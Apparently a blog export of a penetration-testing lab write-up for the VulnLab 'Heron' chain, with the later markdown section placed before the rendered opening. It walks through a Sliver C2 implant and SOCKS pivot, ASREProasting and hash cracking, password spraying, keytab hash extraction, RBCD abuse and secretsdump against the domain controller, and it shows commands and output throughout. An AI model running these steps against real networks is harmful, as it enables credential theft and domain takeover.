`./heron_lin &`\n\n![](/images/vulnlab/heron-vl/i.png)\n\n# Pivoting to the DC\n\nNow that we have completely compromised the `FRAJMP` jumpbox, we can extract a very important piece of information on domain-joined Linux machines that I learned to exploit during [Hybrid](https://dan-feliciano.com/2024/06/05/hybrid/).\n\nThere's a file that exists on domain-joined Linux machines called `krb5.keytab`, which contains secrets to the machine account. If this file is decrypted, we can view the machine accounts NT hash. This machine account has the potential to have privileges that can lead us to the DC.\n\nWe can use a tool called [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) for this. The Python script associated with this allows us to match key values with their encryption types, varying from different types of AES encryption algorithms. Once decrypted with the keytab file (you can download this to your local machine using Sliver), you should receive an output similar to the below.\n\n```\n└─$ python3 KeyTabExtract/keytabextract.py krb5.keytab \n[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.\n[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.\n[+] Keytab File successfully imported.\n        REALM : HERON.VL\n        SERVICE PRINCIPAL : FRAJMP$/\n        NTLM HASH : 6f55b[...snip...]e8254f7\n        AES-256 HASH : 7be44e62e24[...snip...]a3050dd586130e7\n        AES-128 HASH : dcaae[...snip...]6cbd0cd\n```\n\nNow that we have this machine account we would be able to use it in a variety of different domain escalation tactics if `FRAJMP$` has any privileges over any other domain objects.\n\nThat being said, we actually are not required to do this. I did some testing with `crackmapexec` to see if their was any password reusage on the `_local` user credentials that we have and came back with a successful result to a new user.\n\n```\n└─$ proxychains4 crackmapexec smb 10.10.220.53 -u full_ul.txt -p '(_local PASSWORD)' --continue-on-success\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:135  ...  OK\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK\nSMB         10.10.220.53    445    MUCDC            [+] heron.vl\\Julian.Pratt:[...snip...]\n```\n\nAs you can see, the `Julian.Pratt` user seems to have the same password as the `_local` user on the jumpbox. We can assume that `Julian.Pratt` (with him being the head of IT) was attempting to try and set up an SSH connection to `FRAJMP` using PuTTY.\n\nSince we have access to this user now with his credentials, we can login to his home directory that is being hosted on SMB.\n\n```\nsmb: \\Julian.Pratt\\> ls\n  .                                   D        0  Sun Jun  2 06:47:14 2024\n  ..                                  D        0  Sat Jun  1 11:10:46 2024\n  frajmp.lnk                          A     1443  Sun Jun  2 06:47:47 2024\n  Is there a way to -auto login- in PuTTY with a password- - Super User.url      A      117  Sat Jun  1 11:44:44 2024\n  Microsoft Edge.lnk                  A     2312  Sat Jun  1 11:44:38 2024\n  mucjmp.lnk                          A     1441  Sun Jun  2 06:47:33 2024\n```\n\nIt seems that this contains a multitude of `lnk` files that we can pull from this share. We'll use `mget *` to read these on our local machine.\n\n`frajmp.lnk` seems to be partially unreadable, however it contains the plaintext password for `_local` and `Julian.Pratt` that we already have. `Microsoft Edge.lnk` also does not seem to have anything of use to us, containing some directory calls to the Edge application.\n\nThe part of use to us seems to be within `mucjmp.lnk`, which seems to contain the plaintext password for `adm_prju` amongst some unreadable text.\n\n```\n└─$ cat mucjmp.lnk                                                                 \n2t▒`��ف+B�� �gP�O� �:i�+00�/C:\\�1�X�sPROGRA~1t  ﾨR�B�X�s.BJz\nAProgram Files@shell32.dll,-21781▒P1�X�[PuTTY<  ﾺX�[�X�[.���PuTTY\\2 ��X�� putty.exeD    ﾆX���X�[.putty.exe▒O-N�h�ZC:\\Program Files\\PuTTY\\putty.exe#..\\..\\Program Files\\PuTTY\\putty.exeC:\\Program Files\\PuTTY$adm_prju@mucjmp -pw [...snip...]�&�\n```\n\n# RBCD to MUCDC\n\nIf we look at `adm_prju`'s domain node in Bloodhound, we can see that they possess an interesting outbound access control.\n\n![](/images/vulnlab/heron-vl/j.png)\n\nIt seems that since `adm_prju` is within the `ADMINS_T1` group, they have the `WriteAccountRestrictions` privilege over the domain controller.\n\nHaving `WriteAccountRestrictions` means that `adm_prju` has write access to all of the attributes on the machine, notably `msDS-AllowedToActOnBehalfOfOtherIdentity`. If we have the ability to modify this attribute, this means we can abuse resource-based constrained delegation.\n\nFor a small note on what resource-based constrained delegation is, it essentially allows us to request a service ticket for a specified service name to which will be impersonated by a user of our selection. We can then import this service ticket to use for either authentication or credential dumping, depending on the user we impersonate.\n\nThe process for this is relatively simple, as Bloodhound outlines our attach flow in their help page for this specific attack. Note that this requires the user to have control of a machine that has an SPN set, which we currently do since we have control over `FRAJMP` and it's NT hash (meaning we'll just need to PTH with the `FRAJMP$` NT hash in our commands instead of a password).\n\nSo to start let's ensure that `FRAJMP$` can delegate on behalf of `MUCDC$`.\n\n```\n└─$ proxychains4 impacket-rbcd -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -action 'write' 'heron.vl/adm_prju:(ADM_PRJU PASSWORD)'\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:389  ...  OK\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)\n```\n\nNow that the jumpbox can delegate on behalf of the domain controller, we can request the TGT with Impacket's `getST` tool. This will utilize both `S4U2Self` and `S4U2Proxy` to impersonate the specified user and obtain a valid service ticket for that user. \n\nI found that the Administrator account is disabled and was replaced with `_admin`, so we'll request for that user instead. You could also request to impersonate `MUCDC$`, as we'll be able to dump credentials with both of those accounts.\n\n```\n└─$ proxychains4 impacket-getST -spn 'cifs/mucdc.heron.vl' -impersonate '_admin' 'heron.vl/FRAJMP$' -hashes :(FRAJMP NT HASH)\n......\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK\n[*] Impersonating _admin\n[*] Requesting S4U2self\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK\n[*] Requesting S4U2Proxy\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK\n[*] Saving ticket in _admin@cifs_mucdc.heron.vl@HERON.VL.ccache\n```\n\nThe ticket should be saved in an appropriate file with a file name specified at the bottom of the command.\n\nLet's now set our Kerberos authentication global variable to be directed to this ticket. Note that if you impersonated the `MUCDC$` machine account, you may need to rename the ticket so that the `$` special character doesn't conflict with the global variable setting.\n\n```\n└─$ export KRB5CCNAME=_admin@cifs_mucdc.heron.vl@HERON.VL.ccache\n```\n\nNow we can attempt to dump all of the secrets through our SOCKS proxy using Impacket's `secretsdump` command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy so be sure to give it some time.\n\n```\n└─$ proxychains4 impacket-secretsdump -k mucdc.heron.vl\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x7a8b61a266b3e6ba7b55725d51f2b723\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n......\n_admin:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nYou'll receive more of an output, as Impacket will dump every password hash for domain user and machine account that is cached on the DC. Since we were able to dump the `_admin` hash, we should be able to simply authenticate to the machine and steal the root flag.\n\nThe only stipulate is that WinRM is not enabled on this machine, and attempting to authenticate to RDP did not work when I tested it initially. We can still simply login to the `C$` SMB share with our admin hash and view the root flag. You can also use `smbexec` with the cached Kerberos ticket that we have to gain code execution to the machine.\n\n```\n└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\C$ -U '_admin' --pw-nt-hash (_ADMIN NT HASH)\n......\nsmb: \\> cd Users\\Administrator\\Desktop\nsmb: \\Users\\Administrator\\Desktop\\> get root.txt\ngetting file \\Users\\Administrator\\Desktop\\root.txt of size 36 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\n\n└─$ cat root.txt  \n[...snip...]\n```\n\nAs you can see, now that we were able to read the root flag, that means we have compromised this machine!\n\n![](/images/vulnlab/heron-vl/k.png)\n\n# Conclusion\n\nBig thanks to xct for the development of this machine, it really helped with strengthening domain-joined Linux attacks. I also have learned to remember to keep things simple, and always to make sure to check every last corner of the filesystems that you have access to.\n\n# Resources\n\nhttps://github.com/BishopFox/sliver\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/t0thkr1s/gpp-decrypt\nhttps://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/\nhttps://github.com/sosdave/KeyTabExtract\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\nhttps://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9","slug":"heron","published":1,"updated":"2024-06-28T21:03:52.039Z","_id":"clxz6kn8100009uuffenrg92u","comments":1,"layout":"post","photos":[],"content":"<p>This is the newest chain in the medium difficulty that was created by xct, I’m going into this relatively blind so I hope I’ll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. </p>\n<p>I want to thank both xct and otter for their help on this during the initial access portion of the chain, overthinking is a common attribute to have when you start out as a red teamer so it’s important to keep it simple (at least that’s what I learned for initial access during this chain).</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s do our usual NMAP scans.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:48 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.128.117</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">All 1000 scanned ports on 10.10.186.21 are in ignored states.</span><br><span class=\"line\">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 113.11 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:50 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.128.118</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 999 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds</span><br></pre></td></tr></table></figure>\n\n<p>There doesn’t seem to be much for us to work with here. From my first guess, every port within the domain controller <code>.21</code> is behind a firewall. This means we won’t be able to access it until after we have taken control of the first machine. Furthermore this also means we have no way to identify any users directly from the DC due to Kerberos not being accessible.</p>\n<p>We’ll have to start from SSH on the domain-joined Linux machine, as this seems to be the only port available. I also made sure to confirm this as the case with <code>rustscan</code>, which you can find <a href=\"https://github.com/RustScan/RustScan\">here</a>. It’s a modernized version of NMAP, and is used for discovering ports at an increased pace.</p>\n<p>Luckily enough I gave a quick peek at the Wiki page for the machine and it seems that this is an assumed-breach scenario. Heron Corp has given us credentials from which to use for our pen-test.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest:Heron123!</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ssh pentest@10.10.128.118</span><br><span class=\"line\">......</span><br><span class=\"line\">Last login: Fri Jun  7 10:34:38 2024 from 10.8.0.101</span><br><span class=\"line\">pentest@frajmp:~$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SOCKS-Proxy-to-the-DC\"><a href=\"#SOCKS-Proxy-to-the-DC\" class=\"headerlink\" title=\"SOCKS Proxy to the DC\"></a>SOCKS Proxy to the DC</h1><p>So as explained earlier, the first part of this chain is looking through the domain-joined Linux machine and understanding if there are any ways to elevate to root. Given that the first machine of this chain is through the Linux machine, I’m assuming that once we obtain root access we should have the ability to use the machine account and the <code>/etc/krb5.keytab</code> file (containing the machine account’s NT hash) to compromise the DC.</p>\n<p>However after a bit of file enumeration, you’ll notice that there isn’t really much for you to exploit initially. We don’t have access to any of the users (nor are there any binaries for us to exploit as the <code>pentest</code> user, however there are two domain users in the <code>/home</code> directory which are <code>svc-web-accounting</code> and <code>svc-web-accounting-d</code>. Since we have these users, we can try to kerberoast&#x2F;ASREProast to try and decrypt their plaintext passwords. In order to even do this though, we’ll need to interact with the DC.</p>\n<p>Since we don’t have access to the DC directly from our local machine, we can use a proxy determine if the jumpbox is able to connect to it due to it being within the scope of the firewall (or at least there seems to be a firewall active). We’ll need to start up a SOCKS proxy on the jumpbox in order to do this, and then execute our commands through the proxy. I usually opt to use <code>proxychains</code> for this, though you are free to use other tools that accomplish the same result.</p>\n<p>I’ll start up a <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> server on our local Kali machine, I’m mainly doing this because Sliver has a built in SOCKS proxy command that should start a proxy on a given port easily. Firstly, we’ll need to create an implant and curl it to the jumpbox.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; generate --mtls (KALI IP) --os linux --arch amd64 --skip-symbols --save /home/daz/tech/vl/heron/writeup/ --name heron_lin</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/heron-vl/b.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; mtls</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Starting mTLS listener ...</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully started job #1</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 39b2e695 heron_lin - 10.10.128.118:37554 (frajmp.heron.vl) - linux/amd64 - Thu, 27 Jun 2024 23:34:54 EDT</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have an implant on the jumpbox, we can start up a SOCKS proxy as explained earlier using <code>socks5 start</code>. The default port for the proxy should be running on port 1081, though it may be different for others.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (heron_lin) &gt; socks5 start</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started SOCKS5 127.0.0.1 1081  </span><br><span class=\"line\">⚠  In-band SOCKS proxies can be a little unstable depending on protocol</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the proxy running through the implant, we’ll need to edit our proxychains configuration file to reflect the port that the proxy is being served on. This can be found at either <code>/etc/proxychains.conf</code> or <code>/etc/proxychains4.conf</code>.</p>\n<p>The setting that we’ll need to change is at the bottom of the configuration file, denoted (with changes) from the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ProxyList]</span><br><span class=\"line\"># add proxy here ...</span><br><span class=\"line\"># meanwhile</span><br><span class=\"line\"># defaults set to &quot;tor&quot;</span><br><span class=\"line\">socks5 127.0.0.1 1081</span><br></pre></td></tr></table></figure>\n\n<p>Now that the configuration is set, you should be able to interact with the <code>proxychains4</code> (or <code>proxychains</code>) utility directly from Kali. This should be able to direct all of your tools to be executed within the space of the jumpbox instead of your local machine. Let’s verify that this works by running an NMAP scan for port 445 (SMB) on the DC (just due to this being a default port).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 nmap -sT -p445 10.10.128.117</span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 23:40 EDT</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:80  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK</span><br><span class=\"line\">Nmap scan report for mucdc.heron.vl (10.10.128.117)</span><br><span class=\"line\">Host is up (0.22s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">445/tcp open  microsoft-ds</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems that the SMB port is open on the DC meaning that the firewall is indeed active. This means that most (if not, all) of our tooling will need to go through our proxy.</p>\n<p>Our next step is to scan the DC to determine what other ports are available on it. I used SMB as a dummy port for the test above (which we know came back as an open port) so we’ll look for ports aside from that.</p>\n<p>I’ve found that using NMAP through a SOCKS proxy is generally slow, due to having to go through the tunnel for each specific port. An easy workaround for this is scanning ports directly from jumpbox by dropping a binary to the machine. To prevent having to also recursively drop all of the libraries that NMAP uses, I decided to utilize an alternative being <a href=\"https://github.com/RustScan/RustScan\">rustscan</a>.</p>\n<p>We can upload the binary easily with Sliver’s <code>upload</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest@frajmp:/tmp$ chmod 777 rustscan</span><br><span class=\"line\">pentest@frajmp:/tmp$ ./rustscan -a 10.10.128.117</span><br><span class=\"line\">......</span><br><span class=\"line\">Open 10.10.128.117:389</span><br><span class=\"line\">Open 10.10.128.117:445</span><br><span class=\"line\">Open 10.10.128.117:464</span><br><span class=\"line\">Open 10.10.128.117:53</span><br><span class=\"line\">Open 10.10.128.117:80</span><br><span class=\"line\">Open 10.10.128.117:88</span><br><span class=\"line\">Open 10.10.128.117:135</span><br><span class=\"line\">Open 10.10.128.117:139</span><br><span class=\"line\">Open 10.10.128.117:593</span><br><span class=\"line\">Open 10.10.128.117:636</span><br><span class=\"line\">Open 10.10.128.117:3268</span><br><span class=\"line\">Open 10.10.128.117:3269</span><br><span class=\"line\">Open 10.10.128.117:3389</span><br><span class=\"line\">Open 10.10.128.117:9389</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the usual ports for a DC seem to be open (notably LDAP and RDP). However it seems as though a webserver is also open on the DC.</p>\n<h1 id=\"Tunneling-to-the-HTTP-Webserver-on-the-DC\"><a href=\"#Tunneling-to-the-HTTP-Webserver-on-the-DC\" class=\"headerlink\" title=\"Tunneling to the HTTP Webserver on the DC\"></a>Tunneling to the HTTP Webserver on the DC</h1><p>Before we interact with LDAP at all, I want to take a look to the at the webserver to see if there is anything for us to exploit initially.</p>\n<p>To ensure that we know the domain name of the DC (the jumpbox’s domain name is <code>frajmp</code> as seen in the SSH login), we can use <code>crackmapexec</code> to view the information with no credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec smb 10.10.128.117                                </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:135  ...  OK</span><br><span class=\"line\">SMB         10.10.128.117   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)</span><br></pre></td></tr></table></figure>\n\n<p>As seen from the above, the DC’s domain name is <code>mucdc.heron.vl</code>. We’ll add this as well as <code>frajmp.heron.vl</code> to our <code>/etc/hosts</code> file to reflect any domain name resolutions that we might need in the future.</p>\n<p>We’ll need to use our SOCKS proxy to be able to access the webserver, which we can do by utilizing a separate profile in FoxyProxy. I usually use this solely for Burpsuite, so it’s a nice change of pace to be able to use FoxyProxy for another purpose. Let’s create another profile that uses the SOCKS proxy specifically.</p>\n<p><img src=\"/images/vulnlab/heron-vl/c.png\"></p>\n<p>Make sure that the <code>Port</code> and <code>Type</code> reflect the proxy accordingly. Once this profile is created, enable it through the FoxyProxy extension and attempt to access the webpage.</p>\n<p><img src=\"/images/vulnlab/heron-vl/d.png\"></p>\n<p>As you can see from the image, it seems that this webpage is the static landing page for Heron Corp. While there isn’t much to see here, we do have more users to add to our LDAP enumeration list that we’ll be trying to exploit shortly.</p>\n<p>Just to ensure that we aren’t missing any other web applications, let’s try to see if we can access any subdomains running on this port. I ran into some issues running <code>gobuster</code> through the proxy from our local machine (mainly the webserver crashing), so let’s try to do it from the jumpbox. Fortunately, <code>ffuf</code> does not use any additional libraries so I wouldn’t expect there to be any issues if we drop the sole binary to the jumpbox.</p>\n<p>We’ll also need to drop a subdomain wordlist to use alongside <code>ffuf</code>, I usually opt to use <code>subdomains-top1million-110000.txt</code> from <a href=\"https://github.com/danielmiessler/SecLists\">SecLists</a>. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (heron_lin) &gt; upload /usr/bin/ffuf</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Wrote file to /tmp/ffuf</span><br><span class=\"line\"></span><br><span class=\"line\">sliver (heron_lin) &gt; upload /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Wrote file to /tmp/subdomains-top1million-110000.txt</span><br></pre></td></tr></table></figure>\n\n<p>If you receive a timeout on the Sliver upload command for <code>ffuf</code>, disregard as it should still upload it to the machine.</p>\n<p>If we do run <code>ffuf</code> to enumerate subdomains, every request will come back with a 200 status code (indicating a false positive). We can avert this by excluding the size of the request that seems to be the same amongst all of the false positives using the <code>-fs</code> tag.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest@frajmp:/tmp$ ./ffuf -w subdomains-top1million-110000.txt -u http://heron.vl -H &quot;Host: FUZZ.heron.vl&quot; -fs 4128</span><br><span class=\"line\"></span><br><span class=\"line\">accounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 24ms]</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have received a <code>401</code> request for <code>accounting</code> as the subdomain, let’s see if we can browse to it to understand why this specific subdomain is encountering an error.</p>\n<p><img src=\"/images/vulnlab/heron-vl/e.png\"></p>\n<p>This subdomain seems to have authentication tied to it, meaning we won’t be able to access it until later on in the attack path.</p>\n<h1 id=\"ASREPRoasting-to-Crack-Passwords\"><a href=\"#ASREPRoasting-to-Crack-Passwords\" class=\"headerlink\" title=\"ASREPRoasting to Crack Passwords\"></a>ASREPRoasting to Crack Passwords</h1><p>Given the point that we’re at now, we should have a few users that we can test against to determine if any users are vulnerable to kerberoasting or ASREProasting. The user list at this point should look like the following. (Note that I added a few usernames that are regularly on Windows workstations, such as <code>Administrator</code> and <code>Guest</code>)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator</span><br><span class=\"line\">krbtgt</span><br><span class=\"line\">Guest</span><br><span class=\"line\">svc-web-accounting-d</span><br><span class=\"line\">svc-web-accounting</span><br><span class=\"line\">wayne.wood</span><br><span class=\"line\">julian.pratt</span><br><span class=\"line\">samuel.davies</span><br></pre></td></tr></table></figure>\n\n<p>Let’s test for ASREProasting using Impacket’s <code>GetNPUsers</code> tool. Essentially what this will do is check if the <code>NO_PREAUTH_REQUIRED</code> is set to the user’s accounting. If this is set to a user account, we can essentially send an ASREQ to the KDC which will return an ASREP ticket that is encrypted with the users plaintext password.</p>\n<p>We’ll use the Guest account with no password to run this command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-GetNPUsers heron.vl/&#x27;Guest&#x27; -dc-ip 10.10.128.117 -no-pass -request -usersfile initial_ul.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:88  ...  OK</span><br><span class=\"line\">$krb5asrep$23$samuel.davies@HERON.VL:11082947e1ef[...snip...]e1316ef77fc294</span><br></pre></td></tr></table></figure>\n\n<p>As seen from above, a valid ASREP ticket was returned for the <code>samuel.davies</code> user. We can try to crack this using <code>hashcat</code> along with the specific hash ID (being 18200) as seen in the <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat wiki</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 18200 samuel.davies.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">a6b5c3a4a77676b6134c9302e03726ef67af6288c07a47e44072e62fb80bad6d758edeacacfea413637179588c6a110a65570e84e9a9cf843663bd66f851e193a13943e1316ef77fc294:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>As seen from the above, we were able to successfully crack the password for <code>samuel.davies</code>. This opens up our attack path to a range of various options, notably dumping LDAP as my initial thought.</p>\n<h1 id=\"Dumping-LDAP\"><a href=\"#Dumping-LDAP\" class=\"headerlink\" title=\"Dumping LDAP\"></a>Dumping LDAP</h1><p>Let’s now dump the domain with Bloodhound and the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a>. We can examine any domain objects and also determine if <code>samuel.davies</code> has any privileges against other users. This should also increase our user list as you’ll see shortly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 bloodhound-python -d &#x27;heron.vl&#x27; -u &#x27;samuel.davies&#x27; -p &#x27;(SAMUEL.DAVIES PASSWORD)&#x27; -c all -ns 10.10.128.117 --zip</span><br><span class=\"line\">......</span><br><span class=\"line\">INFO: Compressing output into 20240628004605_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>We can now upload the compressed archive to Bloodhound after starting up the <code>neo4j</code> and <code>bloodhound</code> applications respectively.</p>\n<p>Upon viewing the domain objects, it does not seem that <code>samuel.davies</code> has any notable privileges to exploit in our situation. That being said, I did notice a privilege that one of the users on our current user list has.</p>\n<p><img src=\"/images/vulnlab/heron-vl/f.png\"></p>\n<p>It seems that the <code>svc-web-accounting</code> has <code>GenericWrite</code> privileges over the <code>MUCJMP</code> workstation. While it seems that this chain only consists of two machines, it seems that there could be other machine accounts that are present within the environment.</p>\n<p>I did some more enumeration on the other machine accounts present in LDAP, and it seems that this environment also has <code>ACCOUNTING-PREP</code> and <code>ACCOUNTING-STAG</code>.</p>\n<p>Moving on from this, I made sure to utilize <code>ldapsearch</code> through our SOCKS proxy to increase our user list. I’ve made a script to do this for us, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 ldapsearch -x -LLL -H ldap://mucdc.heron.vl -D &#x27;samuel.davies@heron.vl&#x27; -b &#x27;DC=heron,DC=vl&#x27; -w &#x27;(SAMUEL.DAVIES PASSWORD)&#x27; | grep userPrincipalName | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; full_ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>As we can see with the file created from <code>ldapsearch</code>, our user list has increased to over 20 users.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Katherine.Howard</span><br><span class=\"line\">Rachael.Boyle</span><br><span class=\"line\">Anthony.Goodwin</span><br><span class=\"line\">Carol.John</span><br><span class=\"line\">Rosie.Evans</span><br><span class=\"line\">Adam.Harper</span><br><span class=\"line\">Adam.Matthews</span><br><span class=\"line\">Steven.Thomas</span><br><span class=\"line\">Amanda.Williams</span><br><span class=\"line\">Vanessa.Anderson</span><br><span class=\"line\">Jane.Richards</span><br><span class=\"line\">Rhys.George</span><br><span class=\"line\">Mohammed.Parry</span><br><span class=\"line\">Julian.Pratt</span><br><span class=\"line\">Wayne.Wood</span><br><span class=\"line\">Danielle.Harrison</span><br><span class=\"line\">Samuel.Davies</span><br><span class=\"line\">Alice.Hill</span><br><span class=\"line\">Jayne.Johnson</span><br><span class=\"line\">Geraldine.Powell</span><br><span class=\"line\">adm_hoka</span><br><span class=\"line\">adm_prju</span><br><span class=\"line\">svc-web-accounting</span><br><span class=\"line\">svc-web-accounting-dev</span><br></pre></td></tr></table></figure>\n\n<p>We can test for kerberoasting&#x2F;ASREProasting for these users, to which you will find that <code>svc-web-accounting</code> is kerberoastable. That being said even if you do get an encrypted Kerberos TGT from them, you are unable to crack it (from just using rockyou).</p>\n<h1 id=\"Enumerating-SMB-Shares\"><a href=\"#Enumerating-SMB-Shares\" class=\"headerlink\" title=\"Enumerating SMB Shares\"></a>Enumerating SMB Shares</h1><p>I decided to move on from LDAP at this point, since it seems that we’ll need to compromise another user through another service if we want to move forward in the attack chain. Since we have credentials for <code>samuel.davies</code>, we can see if there are any shares that we have read access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 smbclient -L 10.10.128.117 -U 